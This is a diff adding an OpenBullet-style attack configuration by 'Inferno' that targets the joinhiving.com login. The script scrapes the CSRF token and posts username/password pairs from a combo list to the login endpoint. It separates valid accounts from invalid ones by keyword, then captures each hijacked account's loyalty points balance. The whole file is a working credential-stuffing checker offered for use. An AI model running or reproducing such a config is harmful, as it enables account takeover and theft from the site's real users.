@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "Joinhiving Fr | Inferno",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-01T15:18:37.907539+00:00",
+  "AdditionalInfo": "",
+  "Author": "Inferno",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Getcsrf.Inferno REQUEST GET "https://www.joinhiving.com/en_GB/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Csrf.Inferno PARSE "<SOURCE>" LR "_token\" value=\"" "\"" Recursive=FALSE -> VAR "C" "" "" 
+#Post.Inferno REQUEST POST "https://www.joinhiving.com/fr_FR/login_check" AutoRedirect=TRUE 
+  CONTENT "_password=<PASS>&_remember_me=on&_submit=&_username=<USER>&_csrf_token=<C>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#KEY_CHECK.Inferno KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY ">Log out<" 
+    KEY "memberarea" 
+  KEYCHAIN Failure OR 
+    KEY "access your Member Area." 
+    KEY "Oops. Pour accéder à votre Espace" 
+#Cappage.Inferno REQUEST GET "https://www.joinhiving.com/fr_FR/memberarea/point" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Capture.Inferno PARSE "<SOURCE>" LR "Points acquis :" "Points" Recursive=FALSE -> VAR "Points available" "" "" 
